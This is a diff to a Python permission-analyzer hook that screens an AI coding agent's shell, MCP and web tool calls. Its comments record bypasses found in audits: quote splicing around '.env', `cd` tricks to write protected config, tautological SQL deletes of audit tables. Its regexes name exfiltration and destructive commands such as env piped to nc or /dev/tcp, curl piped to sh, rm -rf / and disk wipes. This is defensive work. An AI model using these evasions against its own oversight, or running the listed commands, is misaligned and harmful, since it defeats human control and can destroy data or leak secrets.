@@ -11,10 +11,10 @@ v3.1: BLOCKED_PATHS Bash enforcement, CLAUDE_MD_PLUGIN_EDIT bypass removal,
 v3.4: Web egress gate for WebFetch/WebSearch (exfiltration control)
 v3.5: BLOCKED_PATHS enforced for MCP tools via _candidate_paths() +
       GOVERNANCE_PATHS/ESCALATE for the .claude/ rule-hook-agent-skill corpus
-v3.6 (SEC1-6, 2026-08-18): mcp__github__* write-tool path extraction,
+v3.6 (2026-08-18, live security-bypass closures): mcp__github__* write-tool path extraction,
       mcp__context-mode__ctx_execute* treated as Bash-equivalent, Bash
       write-primitive coverage (patch/git apply/tar/unzip/ed), glob/quote-
-      splicing-resistant credential detection, Bash curl/wget egress gate,
+      splicing-resistant credential detection, Bash network-egress gate,
       query-carrying MCP tools routed through the secret-in-query check.
 """
 
@@ -159,8 +159,14 @@ _MCP_FS_READONLY_SUFFIXES = {
 
 # Argument names carrying a path across the filesystem MCP tools
 # (write_file/edit_file/create_directory use `path`; move_file uses
-# `source`/`destination`).
-_MCP_PATH_KEYS = ("file_path", "path", "source", "destination", "target", "dest")
+# `source`/`destination`). `paths`/`file_paths` added 2026-08-18:
+# read_multiple_files carries its targets as a *list* under a
+# plural key that this tuple never matched, so a multi-file credential read
+# via that one tool was invisible to every path-based check below.
+_MCP_PATH_KEYS = (
+    "file_path", "path", "source", "destination", "target", "dest",
+    "paths", "file_paths",
+)
 
 # SQLite statements that name a filesystem path directly.
 _SQL_ATTACH_RE = re.compile(
@@ -207,8 +213,13 @@ def _candidate_paths(tool: str, tool_input: dict) -> list[str]:
     inp = tool_input or {}
     paths: list[str] = []
 
-    if tool in ("Edit", "Write", "MultiEdit"):
-        p = inp.get("file_path", inp.get("path", ""))
+    if tool in ("Edit", "Write", "MultiEdit", "NotebookEdit", "Artifact"):
+        # NotebookEdit carries its target as notebook_path, not file_path;
+        # Artifact carries file_path but publishes content to a hosted page
+        # rather than the local filesystem — surfaced here so the credential
+        # gate at step 3d can still cover it, even though a
+        # BLOCKED_PATHS/GOVERNANCE_PATHS hit is not really meaningful for it.
+        p = inp.get("file_path") or inp.get("notebook_path") or inp.get("path", "")
         if p:
             paths.append(str(p))
         return paths
@@ -225,7 +236,7 @@ def _candidate_paths(tool: str, tool_input: dict) -> list[str]:
                     paths.append(val)
                 elif isinstance(val, (list, tuple)):
                     paths.extend(str(v) for v in val if v)
-        # mcp__github__* (SEC1, 2026-08-18): create_or_update_file/delete_file/
+        # mcp__github__* (2026-08-18): create_or_update_file/delete_file/
         # push_files etc. write repo content and were entirely unchecked —
         # _MCP_PATH_KEYS didn't apply because the branch above is gated to
         # mcp__filesystem__ only. Read-shaped suffixes (get_*/list_*/search_*)
@@ -256,6 +267,34 @@ def _candidate_paths(tool: str, tool_input: dict) -> list[str]:
             if isinstance(val, str) and val:
                 paths.extend(_sql_candidate_paths(val))
 
+    seen: set[str] = set()
+    return [p for p in paths if not (p in seen or seen.add(p))]
+
+
+def _mcp_read_candidate_paths(tool: str, tool_input: dict) -> list[str]:
+    """Every path-like argument an MCP call carries, INCLUDING read-only
+    filesystem tools (2026-08-18).
+
+    `_candidate_paths()` deliberately exempts `_MCP_FS_READONLY_SUFFIXES`
+    (read_text_file, read_multiple_files, ...) from the BLOCKED_PATHS/
+    GOVERNANCE_PATHS *write* check — you must be able to read CLAUDE.md. But
+    that exemption also meant those exact tools never surfaced their paths
+    for the *credential* gate, so `mcp__filesystem__read_text_file
+    {"path": ".env"}` reached zero checks and exfiltrated the file into
+    context. This function is used ONLY at step 3d (credential gate), never
+    for the write-path check — a read-only tool's paths must be credential-
+    checked regardless of whether they're also write-checked.
+    """
+    if not tool.startswith("mcp__"):
+        return []
+    inp = tool_input or {}
+    paths: list[str] = []
+    for key in _MCP_PATH_KEYS:
+        val = inp.get(key)
+        if isinstance(val, str) and val:
+            paths.append(val)
+        elif isinstance(val, (list, tuple)):
+            paths.extend(str(v) for v in val if v)
     seen: set[str] = set()
     return [p for p in paths if not (p in seen or seen.add(p))]
 
@@ -351,8 +390,8 @@ def _glob_filter_hit(spec: str) -> str | None:
     return None
 
 
-# Known-sensitive basenames a Bash glob token is probed against (SEC4,
-# 2026-08-18). _CREDENTIAL_BASENAME_RE needs an exact basename ('cat .env'
+# Known-sensitive basenames a Bash glob token is probed against
+# (2026-08-18). _CREDENTIAL_BASENAME_RE needs an exact basename ('cat .env'
 # denies, 'cat .e*' doesn't — the token isn't a real basename, it's a glob
 # pattern), so credential detection for a glob-shaped token instead asks the
 # reverse question: does this pattern match a name we know is sensitive?
@@ -385,7 +424,7 @@ def _collapse_adjacent_quotes(cmd: str) -> str:
     characters, so it never reconstructs this; without collapsing first,
     `cat '.en''v'` reads as two harmless tokens ('.en', 'v') instead of one
     credential basename. Applied repeatedly to a working copy used only for
-    credential detection (SEC4) — a 3+-way concatenation needs more than one
+    credential detection — a 3+-way concatenation needs more than one
     pass, and this must never affect any other check's view of `cmd`.
     """
     prev = None
@@ -393,7 +432,179 @@ def _collapse_adjacent_quotes(cmd: str) -> str:
     while prev != out:
         prev = out
         out = out.replace("''", "").replace('""', "").replace("'\"", "").replace("\"'", "")
+        # Backslash-escaped characters ('.en\v' -> '.env') collapse the same
+        # way Bash itself does — without this,
+        # 'cat .en\vironment.env'-style splicing evaded credential detection
+        # exactly like the adjacent-quote case above.
+        out = re.sub(r"\\(.)", r"\1", out)
     return out
+
+
+# Every directory change in the command, not just a leading `cd <dir> &&`
+# prefix (2026-08-18): the anchored form missed `pushd`, a second chained
+# `cd`, a subshell `(cd … && …)`, a newline separator, and the `cd` inside
+# `bash -c '…'`. The lookbehind keeps 'abcd foo' / '/usr/bin/cd' from
+# matching while allowing '(', quote, ';', '&&' and newline to precede it.
+_CD_CHDIR_RE = re.compile(
+    r"""(?<![\w./-])(?:cd|pushd)\s+("[^"]*"|'[^']*'|[^\s;&|)]+)"""
+)
+
+
+def _bash_effective_cwd(cmd: str) -> str:
+    """The directory the command's `cd`/`pushd` chain ends up in, or
+    DQIII8_ROOT if there is none.
+
+    `_blocked_path_hit`/`_governance_path_hit` did plain substring matching
+    against the raw command text, so `cd /root/dqiii8/.claude && echo pwned >
+    settings.json` never contained the literal blocked-path token in any
+    form — the write target only becomes '.claude/settings.json' once you
+    resolve it against the directory the `cd` changed into. Every chdir in
+    the command is applied in order, so `cd /root/dqiii8 && cd .claude && …`
+    and `(cd /root/dqiii8/.claude && …)` resolve the same as the canonical
+    single-prefix form.
+    """
+    cwd = str(DQIII8_ROOT)
+    for m in _CD_CHDIR_RE.finditer(cmd):
+        target = m.group(1).strip("'\"")
+        if not target or target.startswith("-"):
+            continue
+        if target in ("~", "$HOME", "${HOME}"):
+            cwd = str(DQIII8_ROOT)
+        elif target.startswith("/"):
+            cwd = os.path.normpath(target)
+        else:
+            cwd = os.path.normpath(os.path.join(cwd, target))
+    return cwd
+
+
+# Archive extraction destination directories (2026-08-18, round-3 audit).
+# `tar -C <dir> -xf a.tar` and `unzip -d <dir> a.zip` write every member of the
+# archive into <dir>, but the destination only ever appeared as a bare
+# directory token — and the BLOCKED/GOVERNANCE matchers need a trailing slash
+# ('.claude/hooks/') or an exact file match, so a directory token never hit.
+# Both tools' short and long destination flags are covered, with or without
+# '='.
+_TAR_DEST_RE = re.compile(
+    r"""\btar\b[^|;&\n]*?\s(?:-C|--directory)(?:=|\s+)("[^"]*"|'[^']*'|[^\s;&|]+)"""
+)
+_UNZIP_DEST_RE = re.compile(
+    r"""\bunzip\b[^|;&\n]*?\s(?:-d|--directory)(?:=|\s+)("[^"]*"|'[^']*'|[^\s;&|]+)"""
+)
+# Same surface, other tools (2026-08-18). tar/unzip were never the only way to
+# unpack attacker-chosen filenames into a directory:
+#   7z/7za/7zr  -o<dir>          — 7zip's own syntax, no space after the flag
+#   bsdtar      -C/--directory   — NOT matched by _TAR_DEST_RE ('bsdtar' has no
+#                                  word boundary before 'tar')
+#   cpio        -D/--directory   — extract mode, e.g. `cpio -idmv -D <dir>`
+#   pip install --target/-t      — writes arbitrary package files (including
+#                                  .py that later gets imported) into <dir>
+_SEVENZIP_DEST_RE = re.compile(
+    r"""\b7z[ar]?\b[^|;&\n]*?\s-o("[^"]*"|'[^']*'|[^\s;&|]+)"""
+)
+_BSDTAR_DEST_RE = re.compile(
+    r"""\bbsdtar\b[^|;&\n]*?\s(?:-C|--directory)(?:=|\s+)("[^"]*"|'[^']*'|[^\s;&|]+)"""
+)
+_CPIO_DEST_RE = re.compile(
+    r"""\bcpio\b[^|;&\n]*?\s(?:-D|--directory)(?:=|\s+)("[^"]*"|'[^']*'|[^\s;&|]+)"""
+)
+_PIP_TARGET_RE = re.compile(
+    r"""\bpip[23]?\b[^|;&\n]*?\binstall\b[^|;&\n]*?\s(?:--target|-t)(?:=|\s+)("[^"]*"|'[^']*'|[^\s;&|]+)"""
+)
+
+_ARCHIVE_DEST_RES = (
+    _TAR_DEST_RE,
+    _UNZIP_DEST_RE,
+    _SEVENZIP_DEST_RE,
+    _BSDTAR_DEST_RE,
+    _CPIO_DEST_RE,
+    _PIP_TARGET_RE,
+)
+
+
+def _archive_dest_dirs(cmd: str) -> list[str]:
+    """Destination directories an archive/installer tool would write into.
+
+    Returned with a trailing separator so the directory tokens in
+    BLOCKED_PATHS/GOVERNANCE_PATHS ('.git/', '.claude/hooks/') can match; the
+    slash-less form is returned too for the file-shaped tokens. Relative
+    destinations are resolved against the command's effective cwd, same as
+    every other Bash write target.
+    """
+    cwd = _bash_effective_cwd(cmd)
+    out: list[str] = []
+    for pattern in _ARCHIVE_DEST_RES:
+        for m in pattern.finditer(cmd):
+            tgt = m.group(1).strip().strip("'\"")
+            if not tgt or tgt.startswith("-"):
+                continue
+            resolved = os.path.normpath(
+                tgt if tgt.startswith("/") else os.path.join(cwd, tgt)
+            )
+            out.append(resolved)
+            out.append(resolved.rstrip("/") + "/")
+    return out
+
+
+def _bash_resolved_write_targets(cmd: str) -> list[str]:
+    """Strings to test against BLOCKED_PATHS/GOVERNANCE_PATHS for a Bash
+    write: the raw command (cheap, catches the common case), the quote/
+    backslash-collapsed command ('CLA''UDE.md' / 'CLA\\UDE.md'
+    evaded the raw-string match), and every relative path-shaped token
+    resolved against the command's effective cwd (a `cd`
+    prefix changes what a bare relative token actually targets).
+    """
+    collapsed = _collapse_adjacent_quotes(cmd)
+    cwd = _bash_effective_cwd(collapsed)
+    out = [cmd, collapsed]
+    out.extend(_archive_dest_dirs(collapsed))
+    for raw_tok in _BASH_TOKEN_SPLIT_RE.split(collapsed):
+        tok = raw_tok.strip().strip("'\"")
+        if not tok or tok.startswith("-") or tok.startswith("$"):
+            continue
+        if tok.startswith("/"):
+            out.append(os.path.normpath(tok))
+        else:
+            out.append(os.path.normpath(os.path.join(cwd, tok)))
+    return out
+
+
+# Reverse-glob probes for BLOCKED_PATHS/GOVERNANCE_PATHS basenames
+# (mirrors _credential_glob_hit for the write-path gate):
+# does a glob-shaped Bash token ('CLAUD?.md', '*.local.json') expand onto a
+# protected basename? Split into two probe sets, same DENY-wins-except-
+# settings.local.json precedence as _blocked_path_hit/_governance_path_hit.
+_BLOCKED_GLOB_PROBES = tuple(sorted({
+    p.rstrip("/").rsplit("/", 1)[-1]
+    for p in BLOCKED_PATHS if p.rstrip("/") and p not in GOVERNANCE_PATHS
+}))
+_GOVERNANCE_GLOB_PROBES = tuple(sorted({
+    p.rstrip("/").rsplit("/", 1)[-1] for p in GOVERNANCE_PATHS if p.rstrip("/")
+}))
+
+
+def _blocked_glob_hit(token: str) -> str | None:
+    """The BLOCKED_PATHS basename a glob-shaped Bash TOKEN would expand to
+    match, or None (excludes the settings.local.json overlap — governance
+    wins there, same as _blocked_path_hit)."""
+    if not token or not _GLOB_WILDCARD_RE.search(token):
+        return None
+    base = token.replace("\\", "/").rsplit("/", 1)[-1]
+    for probe in _BLOCKED_GLOB_PROBES:
+        if probe and fnmatch.fnmatchcase(probe, base):
+            return probe
+    return None
+
+
+def _governance_glob_hit(token: str) -> str | None:
+    """The GOVERNANCE_PATHS basename a glob-shaped Bash TOKEN would expand to
+    match, or None."""
+    if not token or not _GLOB_WILDCARD_RE.search(token):
+        return None
+    base = token.replace("\\", "/").rsplit("/", 1)[-1]
+    for probe in _GOVERNANCE_GLOB_PROBES:
+        if probe and fnmatch.fnmatchcase(probe, base):
+            return probe
+    return None
 
 
 def _url_secret_hit(text: str) -> str | None:
@@ -604,10 +815,64 @@ _BLOB_RAW_MIN = 48
 _BLOB_B64_MIN = 40
 _BLOB_ALNUM_RE = re.compile(r"^[A-Za-z0-9]+$")
 
-# Bash operators that indicate a WRITE to a file
+# Bash operators that indicate a WRITE to a file. Expanded 2026-08-18 —
+# the original list missed sed's long-form flag, perl -i,
+# interactive editors, and curl/wget's own output-to-file flags, all of
+# which write without any of ">"/"tee"/"truncate" appearing.
 _BASH_WRITE_SIGNS = [">", ">>", "tee ", "sed -i", "truncate "]
+_BASH_WRITE_SIGN_PATTERNS = [
+    re.compile(r"\bsed\b[^|;&\n]*\s(?:-i|--in-place)\b"),
+    re.compile(r"\bperl\b[^|;&\n]*\s-\w*i\w*\b"),
+    re.compile(r"(?:^|[\s;&|])(?:ex|vi|vim|nvim|nano|emacs)\s+\S"),
+    re.compile(r"\b(?:curl|wget)\b[^|;&\n]*\s(?:-o|-O|--output|--output-document)\b"),
+    re.compile(r"\b(?:touch|mkdir|chmod|chown|ln)\b"),
+]
 
-# context-mode MCP server (SEC2, 2026-08-18): allow-listed in
+# rm invocation matcher: `rm`, its flags (short-combined/-separate/long-form,
+# any order), then its non-flag arguments. Style-agnostic on purpose
+# (2026-08-18) — the prior literal `rm -rf ...` regexes missed
+# `rm -fr`, `rm -r -f`, `rm --recursive --force`, and `--no-preserve-root`.
+_RM_INVOCATION_RE = re.compile(r"\brm\b((?:\s+-{1,2}[A-Za-z-]+)*)((?:\s+[^\s;&|]+)+)")
+
+
+def _rm_flags_recursive_and_force(flags_blob: str) -> bool:
+    """True if the captured rm flags include both recursive and force,
+    regardless of style: -rf, -fr, -Rf, -r -f, --recursive --force, or any
+    mix of short/long forms."""
+    has_r = has_f = False
+    for tok in flags_blob.split():
+        if tok.startswith("--"):
+            has_r = has_r or tok == "--recursive"
+            has_f = has_f or tok == "--force"
+        elif tok.startswith("-"):
+            letters = tok[1:]
+            has_r = has_r or ("r" in letters or "R" in letters)
+            has_f = has_f or ("f" in letters)
+    return has_r and has_f
+
+
+def _rm_destructive_targets(cmd: str) -> list[str]:
+    """Every rm target reached by a recursive+force invocation — '/', an
+    absolute path, '~', or '$HOME' — flag-order/style agnostic. Non-dangerous
+    targets (relative paths, ALLOWED_DELETIONS-shaped names) are left for the
+    caller, which applies `_rm_target_is_allowed`."""
+    hits: list[str] = []
+    for m in _RM_INVOCATION_RE.finditer(cmd):
+        if not _rm_flags_recursive_and_force(m.group(1)):
+            continue
+        for raw_tgt in m.group(2).split():
+            # Strip surrounding quotes before comparing: `rm -rf "/"` and
+            # `rm -rf '/'` are the exact same catastrophic call as `rm -rf /`
+            # and previously slipped through because the raw token ('"/"')
+            # matched neither '/' nor startswith('/').
+            tgt = raw_tgt.strip("'\"")
+            if not tgt or tgt.startswith("-") or tgt in ("{}", "+", "\\;", ";"):
+                continue
+            if tgt == "/" or tgt.startswith("/") or tgt in ("~", "$HOME", "${HOME}"):
+                hits.append(tgt)
+    return hits
+
+# context-mode MCP server (2026-08-18): allow-listed in
 # settings.local.json, arbitrary sandboxed code/subprocess execution, and its
 # own tool descriptions actively steer callers here instead of Bash ("PREFER
 # THIS OVER BASH for: API calls..., test runners..."). None of it was routed
@@ -646,42 +911,214 @@ def _ctx_mode_command_text(tool: str, inp: dict) -> str:
     return "\n".join(parts)
 
 
-# Bash-level web-egress bypass (SEC5, 2026-08-18): the WebFetch/WebSearch gate
-# (_web_egress_block) never runs for Bash, so 'curl ...$ANTHROPIC_API_KEY',
-# 'printenv | curl -X POST ...' and 'curl ... | sh' all reached the network
-# with zero checks. Scoped to the three concretely observed shapes rather
-# than replicating the full WebFetch gate (host-risk/opaque-blob reasoning
-# over arbitrary shell text is too noisy to be worth it here).
-_NETWORK_EGRESS_BASH_RE = re.compile(r"\b(?:curl|wget)\b")
+# Entry gate for the Bash egress checks below: the WebFetch/WebSearch gate
+# (_web_egress_block) never runs for Bash, so anything that can open a socket
+# from a shell command needs its own trigger here. Matches any shape that can
+# reach the network: egress binaries, Python HTTP and socket clients, and bare
+# bash `/dev/tcp/` redirection, which opens a connection while naming no binary
+# at all. The alternation below is the list — do not restate it elsewhere.
+# Deliberately shape-based, not binary-name-based: a name-only list left the
+# socat/nc sinks in _ENV_DUMP_TO_NET_RE unreachable, and a matched command is
+# only inspected further (secret/env-dump/pipe-to-shell), never denied on the
+# match alone — so over-matching here is cheap and under-matching is not.
+# This is not the full WebFetch gate: host-risk and opaque-blob reasoning over
+# arbitrary shell text is too noisy to be worth running here.
+_NETWORK_EGRESS_BASH_RE = re.compile(
+    r"\b(?:curl|wget|nc|ncat|netcat|socat|scp|sftp|rsync|ssh|ftp|telnet)\b"
+    r"|urllib\.request|requests\.(?:post|get|put|patch)\b|httpx\.|socket\.(?:socket|connect)"
+    r"|http\.client|aiohttp|/dev/tcp/"
+)
 _SENSITIVE_ENV_VAR_RE = re.compile(
     r"\$\{?[A-Z][A-Z0-9_]*(?:_KEY|_TOKEN|_SECRET|_PASSWORD|_PASSWD)\}?\b"
 )
 _ENV_DUMP_TO_NET_RE = re.compile(
     r"\b(?:printenv|env)\b[^|;\n]*\|\s*(?:curl|wget|nc|ncat|netcat|socat)\b"
+    # `exec 3<>/dev/tcp/host/port; env >&3` dumps the environment to a socket
+    # with no pipe and no external binary at all.
+    r"|\b(?:printenv|env)\b[^|;\n]*>&\s*\d"
 )
+# The environment object handed wholesale to a network call in Python
+# (`requests.post(url, data=os.environ)`, `http.client ... os.environ[...]`).
+# `_ENV_DUMP_TO_NET_RE` is shell-pipeline-shaped and never saw these. Only
+# consulted for commands that already look like egress, so a plain
+# `python3 -c "print(os.environ['HOME'])"` is unaffected.
+_PY_ENV_TO_NET_RE = re.compile(r"os\.environ\b")
+# Bare hostname literals ('webhook.site' inside HTTPSConnection('…')) never
+# appear as an http(s):// URL, so the URL sweep below cannot see them.
+_BASH_BARE_HOST_RE = re.compile(r"""['"]([A-Za-z0-9][A-Za-z0-9.-]*\.[A-Za-z]{2,})['"]""")
 _PIPE_TO_SHELL_RE = re.compile(
     r"\b(?:curl|wget)\b[^|;\n]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|python[0-9.]*|perl|ruby)\b"
 )
 
-# Always CRITICAL regardless of mode
+# Always CRITICAL regardless of mode.
+# The literal 'rm -rf /' entries are handled separately by
+# _rm_destructive_targets() (flag-order/style agnostic — see _RM_INVOCATION_RE)
+# rather than as regexes here; evaluate() checks that first.
 CRITICAL_PATTERNS = [
-    r"rm\s+-rf\s+/\s*$",  # rm -rf / (exact root filesystem wipe)
-    r"rm\s+-rf\s+/\s+",  # rm -rf / followed by space (flags or paths after /)
-    r">\s+/dev/sda",  # write directly to disk device
+    r">\s*/dev/(?:sd[a-z]+|nvme\d+n\d+|vd[a-z]+|hd[a-z]+|md\d+|mapper/\S+)",
     r"\bmkfs\b",  # format a filesystem
-    r"\bdd\b.*\bif=",  # disk dump (potential disk wipe)
+    r"\bdd\b[^|;&\n]*\b(?:if|of)=/dev/(?:sd[a-z]+|nvme\d+n\d+|vd[a-z]+|hd[a-z]+|md\d+|mapper/\S+)",  # `of=` is the destructive half; `if=` is matched too because reading a raw device is how a disk gets copied off the box
+    # Device writes that never go through '>' or dd: `cat /dev/zero | tee
+    # /dev/sda` destroys the disk exactly like '> /dev/sda' did, and
+    # wipefs/parted/sfdisk/fdisk/blkdiscard/shred rewrite the partition
+    # table or scrub the device with no redirection at all.
+    r"\btee\b[^|;&\n]*\s/dev/(?:sd[a-z]+|nvme\d+n\d+|vd[a-z]+|hd[a-z]+|md\d+|mapper/\S+|disk/\S+)",
+    r"\b(?:wipefs|parted|sfdisk|fdisk|blkdiscard|shred)\b[^|;&\n]*\s/dev/\S+",
+    r">\s*/dev/disk/by-(?:uuid|id|label|partuuid|path)/\S+",  # device aliases resolve to the same raw disks
     r":\(\)\s*\{.*:\|:.*\}",  # fork bomb
 ]
 
+# ── Protected-table matching (2026-08-18, round-3 audit) ────────────────────
+# Two shape fixes, both found live by the round-3 re-audit:
+#
+#  * schema qualifier — `UPDATE main.learned_approvals` / `DELETE FROM
+#    sqlite_main.agent_actions` reached the table under a `<schema>.` prefix
+#    the old regexes never allowed for, so the table name simply didn't match.
+#  * tautological predicate — `DELETE FROM agent_actions WHERE 1=1` satisfied
+#    the old `(?!\s+WHERE)` guard (the word WHERE *was* present) while still
+#    deleting every row.
+#
+# Best-effort regex, not a SQL parser — same stance as _SQL_PATHISH_RE above:
+# the well-known no-op predicate shapes are pattern-matched, nothing more.
+_SQL_TABLE_PREFIX = r"(?:[\"'`\[]?\w+[\"'`\]]?\s*\.\s*)?[\"'`\[]?"
+_PROTECTED_AUDIT_TABLES = r"(?:agent_actions|permission_decisions|session_memory|instincts|sqlite_master|sqlite_schema)"
+_PROTECTED_MUTATION_TABLES = r"(?:learned_approvals|permission_decisions|agent_actions|instincts|sqlite_master|sqlite_schema)"
+# Predicates that bound nothing. Ordered most-specific-first so `WHERE 1=1`
+# never falls through to the bare-`WHERE 1` branch.
+# End of a WHERE predicate: statement terminator, comment, closing paren, or
+# the closing shell quote of `sqlite3 db "DELETE ... WHERE ..."`.
+_SQL_PREDICATE_END = r"(?:\s*(?:;|--|/\*|\)|[\"'`]|$))"
+
+_SQL_TAUTOLOGY = (
+    r"(?:"
+    r"[\"'`]?\s*1\s*[\"'`]?\s*(?:==|=)\s*[\"'`]?\s*1\s*[\"'`]?"   # 1=1, '1'='1', "1"="1"
+    r"|1\s*(?:<>|!=)\s*0"                                          # 1<>0, 1!=0
+    r"|TRUE\b"                                                     # WHERE TRUE
+    r"|(['\"])([^'\"]*)\1\s*=\s*\1\2\1"                            # 'a'='a' — same literal both sides
+    r"|\b(\w+)\s*=\s*\3\b"                                         # col = col
+    r"|1\s*(?:;|--|/\*|\)|$)"                                      # WHERE 1  (no column at all)
+    # Semantic no-ops (2026-08-18, round-4 gap). Each is anchored to the end of
+    # the predicate (_SQL_PREDICATE_END) so it only fires when the shape *is*
+    # the whole WHERE clause — `WHERE id > -1 AND agent='x'` is genuinely
+    # bounded and must stay APPROVE.
+    r"|\w+\s+IS\s+NOT\s+NULL" + _SQL_PREDICATE_END                 # id IS NOT NULL — true for every PK row
+    + r"|\w+\s*(?:>=|>)\s*-\s*\d+" + _SQL_PREDICATE_END            # id > -1, id >= -999 — true for any non-negative id
+    + r"|\w+\s*(?:<>|!=)\s*-\s*\d+" + _SQL_PREDICATE_END           # id <> -1 — ditto
+    + r")"
+)
+# NOTE: the two branches above use backreferences, so _SQL_TAUTOLOGY may only
+# be concatenated onto patterns that contain no capture groups of their own
+# (_SQL_TABLE_PREFIX / _PROTECTED_*_TABLES are all non-capturing). Adding a
+# capturing group ahead of it would silently renumber \1..\3. The semantic
+# branches appended at the end add no groups, so \1..\3 keep their positions.
+#
+# CEILING — read before adding "one more shape". This is a shape-matcher, not a
+# SQL parser, and building one is explicitly out of scope. It recognises the
+# handful of no-op predicates seen in practice; it does NOT understand SQL, so
+# these still get through and are known-missed, by design:
+#   * `WHERE NOT (1=0)` / any negation of a false predicate
+#   * `WHERE id BETWEEN -999 AND 999999999` (range covering the whole table)
+#   * `WHERE id IN (SELECT id FROM agent_actions)` or any subquery
+#   * `WHERE id > -1 OR agent='x'` — OR'ing a tautology onto a real predicate
+#     (the anchors below deliberately require the no-op to be the *whole*
+#     clause, which trades this miss for zero false positives on bounded ANDs)
+#   * anything computed at runtime (`WHERE id > (SELECT MIN(id)-1 ...)`)
+# The unbounded-DELETE guard above (no WHERE at all) and the blanket
+# UPDATE/ALTER/TRUNCATE/REPLACE/INSERT guard remain the real backstops.
+
+# Literal-vs-literal integer comparison as the entire predicate. Both operands
+# are integer literals from the matched text, so the result can be computed
+# exactly — no parser and no injection risk, just arithmetic. Handled as a
+# function rather than a HIGH_RISK_PATTERNS entry because a regex cannot decide
+# whether `5>=5` is true.
+_SQL_LITERAL_COMPARE_RE = re.compile(
+    r"DELETE\s+FROM\s+" + _SQL_TABLE_PREFIX + _PROTECTED_AUDIT_TABLES
+    + r"\b[\"'`\]]?\s+WHERE\s+(\d+)\s*(>=|<=|<>|!=|==|=|>|<)\s*(\d+)"
+    + _SQL_PREDICATE_END,
+    re.IGNORECASE,
+)
+
+
+def _sql_literal_tautology(cmd: str) -> str | None:
+    """The always-true literal comparison bounding a DELETE on a protected
+    table, or None.
+
+    `DELETE FROM agent_actions WHERE 2>1` deletes exactly what no WHERE at all
+    deletes. An always-*false* one (`WHERE 1>2`) deletes nothing and is not a
+    finding, so the comparison is evaluated rather than merely matched.
+    """
+    for m in _SQL_LITERAL_COMPARE_RE.finditer(cmd):
+        left, op, right = int(m.group(1)), m.group(2), int(m.group(3))
+        truth = {
+            ">": left > right,
+            "<": left < right,
+            ">=": left >= right,
+            "<=": left <= right,
+            "=": left == right,
+            "==": left == right,
+            "<>": left != right,
+            "!=": left != right,
+        }[op]
+        if truth:
+            return f"{left}{op}{right}"
+    return None
+
+
 HIGH_RISK_PATTERNS = [
-    r"rm\s+-rf\s+/",  # rm -rf /anything (non-root paths)
-    r"rm\s+-rf\s+~",
-    r"rm\s+-rf\s+\$HOME",
+    # rm -rf /anything, ~, $HOME are handled by _rm_destructive_targets(),
+    # not as regexes here: a literal regex list cannot stay flag-order agnostic.
     r"DROP\s+TABLE",
-    r"DELETE\s+FROM\s+agent_actions\b(?!\s+WHERE)",  # mass-delete without WHERE
     r"DROP\s+DATABASE",
-    r"chmod\s+777\s+/",
+    # DROP TRIGGER (2026-08-18): agent_actions/instincts are append-only
+    # *because* of DB triggers (01_database_mutations.md). Dropping the
+    # trigger achieves what DROP TABLE achieves — a silently mutable audit
+    # trail — and was not covered by either DROP pattern above.
+    r"DROP\s+TRIGGER",
+    # Mass-delete without WHERE against the audit trail. Widened beyond
+    # agent_actions (2026-08-18): erasing `permission_decisions` erases the
+    # forensic record of this very analyzer's denials *and* starves the
+    # repeat-rejection loop-breaker that reads it.
+    r"DELETE\s+FROM\s+" + _SQL_TABLE_PREFIX + _PROTECTED_AUDIT_TABLES + r"\b[\"'`\]]?(?!\s+WHERE)",
+    # ...and the same delete *with* a WHERE whose predicate is a tautology:
+    # `WHERE 1=1` / `WHERE TRUE` / `WHERE 1` delete exactly the same rows as
+    # no WHERE at all, and previously APPROVED.
+    r"DELETE\s+FROM\s+" + _SQL_TABLE_PREFIX + _PROTECTED_AUDIT_TABLES + r"\b[\"'`\]]?\s+WHERE\s+" + _SQL_TAUTOLOGY,
+    # Any mutating verb against a governance/audit table. `01_database_mutations.md`
+    # makes agent_actions/instincts append-only (DB triggers), and
+    # learned_approvals/permission_decisions drive the permission decision
+    # itself — rewriting either from a shell or through mcp__dqiii8-db__execute
+    # is self-escalation, never routine maintenance. Legitimate writes go
+    # through bin/core/action_log.py, not raw SQL. sqlite_master/sqlite_schema
+    # added 2026-08-18: writing the catalog directly rewrites the schema
+    # (and drops triggers) without naming any protected table at all.
+    r"\b(?:UPDATE|ALTER\s+TABLE|TRUNCATE\s+TABLE|REPLACE\s+INTO|INSERT\s+(?:OR\s+\w+\s+)?INTO)\s+"
+    + _SQL_TABLE_PREFIX + _PROTECTED_MUTATION_TABLES + r"\b",
+    r"PRAGMA\s+writable_schema",  # flips SQLite's schema table writable — arbitrary catalog rewrite
+    r"chmod\s+(?:-[\w-]+\s+)*(?:777|a\+rwx)\s+/\S*",
+    # git push --force / -f / --force-with-lease (2026-08-18). This module had
+    # ZERO matchers for it: `permission_request.py` names it in its own
+    # unrelated CRITICAL_PATTERNS, but that hook only fires for tools *absent*
+    # from settings.json's permissions.allow, and `Bash(*)` is pre-approved —
+    # so nothing enforced it. 00_core_behavior.md files force-push alongside
+    # `rm -rf` and `DROP` as destructive/irreversible, so it gets the same
+    # verdict those get here: DENY, not ESCALATE (ESCALATE is for ambiguous
+    # risk and governance writes; overwriting published history is neither
+    # ambiguous nor recoverable from this side).
+    # Flag-order/style agnostic, like the chmod entry above: the flag may sit
+    # before or after the remote/branch. `-[a-zA-Z]*f` catches bundled short
+    # flags (`-qf`); the trailing lookahead keeps `--follow-tags` and
+    # `-f`-prefixed longer flags from matching.
+    r"\bgit\s+push\b(?:[^|;&\n]*?\s)?"
+    r"(?:--force-with-lease(?:=[^\s;&|]*)?|--force|-[a-zA-Z]*f)(?=\s|$|[;&|])",
 ]
+
+# Readable `rule_triggered` ids for the entries above. The loop falls back to
+# the raw pattern string, which is what every pre-existing entry still records
+# (their ids are asserted by tests), so this only names the ones where a
+# 90-character regex in a permission_decisions row would be useless forensics.
+_HIGH_RISK_RULE_IDS = {
+    HIGH_RISK_PATTERNS[-1]: "git_push_force",
+}
 
 ALLOWED_DELETIONS = [
     "node_modules",
@@ -806,7 +1243,7 @@ class PermissionAnalyzer:
         return True
 
     def _bash_touches_blocked(self, cmd: str, tool: str = "Bash") -> dict | None:
-        """Block Bash (or a context-mode exec-equivalent, SEC2) commands that
+        """Block Bash (or a context-mode exec-equivalent) commands that
         read credential paths or write to any blocked path.
 
         `tool` is only used as the label on the returned decision — every
@@ -830,7 +1267,7 @@ class PermissionAnalyzer:
         # 'cat config/app.env' and 'base64 certs/server.pem' slipped through.
         # Tokenize and reuse the same matcher the read family uses, so Bash and
         # Read/Grep/Glob cannot disagree about what counts as a credential.
